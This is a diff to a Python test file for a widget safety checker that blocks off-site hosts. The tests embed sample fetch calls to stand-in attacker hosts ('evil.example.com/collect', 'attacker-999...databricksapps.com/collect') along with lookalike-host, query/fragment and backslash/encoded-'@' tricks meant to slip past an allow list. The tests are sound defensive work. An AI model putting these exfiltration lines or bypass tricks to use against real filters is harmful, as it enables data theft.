@@ -11,7 +11,25 @@ import sys
 sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "server"))
 
 from services.sql_safety import classify_statement, is_write_statement, strip_noise  # noqa: E402
-from services.widget_safety import offending_hosts, review_widget, review_widget_code  # noqa: E402
+from services.widget_safety import offending_hosts as _offending_hosts  # noqa: E402
+from services.widget_safety import review_widget as _review_widget  # noqa: E402
+from services.widget_safety import review_widget_code as _review_widget_code  # noqa: E402
+
+
+# The approved-app list is passed explicitly so no test reads the settings table.
+APP = "smart-system-prod-1526721948438476.aws.databricksapps.com"
+
+
+def offending_hosts(code, app_hosts=()):
+    return _offending_hosts(code, app_hosts=app_hosts)
+
+
+def review_widget_code(code, app_hosts=()):
+    return _review_widget_code(code, app_hosts=app_hosts)
+
+
+def review_widget(code, data_source="", data_source_type="none", is_executable=False):
+    return _review_widget(code, data_source, data_source_type, is_executable, app_hosts=())
 
 _passed = 0
 _failed = 0
@@ -145,6 +163,55 @@ def test_offsite_fetch_is_refused():
     # host rather than about which API reaches it.
     code = "fetch('https://evil.example.com/collect', { method: 'POST' });"
     check("test_offsite_fetch_is_refused", offending_hosts(code) == {"evil.example.com"})
+
+
+def test_an_approved_databricks_app_may_be_embedded():
+    code = f"const C = () => <iframe src={{'https://{APP}/'}} className=\"h-full w-full\" />;"
+    check("test_an_approved_databricks_app_may_be_embedded", review_widget_code(code, app_hosts=[APP]) == [])
+
+
+def test_an_unlisted_databricks_app_is_refused():
+    # databricksapps.com is shared by every Databricks customer, so being on it
+    # proves nothing about who owns the app.
+    code = "fetch('https://attacker-999.aws.databricksapps.com/collect');"
+    problems = review_widget_code(code, app_hosts=[APP])
+    check(
+        "test_an_unlisted_databricks_app_is_refused",
+        len(problems) == 1 and "attacker-999" in problems[0] and "Admin Panel" in problems[0],
+    )
+
+
+def test_no_databricks_app_is_approved_by_default():
+    check("test_no_databricks_app_is_approved_by_default", offending_hosts(f"'https://{APP}/'") == {APP})
+
+
+def test_a_lookalike_databricks_app_host_is_refused():
+    code = f"fetch('https://{APP}.attacker.example/x');"
+    check(
+        "test_a_lookalike_databricks_app_host_is_refused",
+        offending_hosts(code, app_hosts=[APP]) == {f"{APP}.attacker.example"},
+    )
+
+
+def test_a_query_or_fragment_does_not_make_a_host():
+    # A suffix rule read `evil.example?.databricksapps.com` as a Databricks App;
+    # the browser sends it to evil.example.
+    for code in ("fetch('https://evil.example?x.databricksapps.com');",
+                 "fetch('https://evil.example#x.databricksapps.com');"):
+        if offending_hosts(code, app_hosts=[APP]) != {"evil.example"}:
+            check("test_a_query_or_fragment_does_not_make_a_host", False)
+            return
+    check("test_a_query_or_fragment_does_not_make_a_host", True)
+
+
+def test_a_backslash_cannot_smuggle_a_host_past_the_check():
+    # Browsers read `\` as `/`, so this goes to evil.example, not the CDN.
+    for code in ("fetch('https://evil.example\\\\@cdn.jsdelivr.net/x');",
+                 "fetch('https://evil.example\\u0040cdn.jsdelivr.net/x');"):
+        if offending_hosts(code) != {"evil.example"}:
+            check("test_a_backslash_cannot_smuggle_a_host_past_the_check", False)
+            return
+    check("test_a_backslash_cannot_smuggle_a_host_past_the_check", True)
 
 
 def test_a_url_in_a_comment_does_not_trip_the_check():
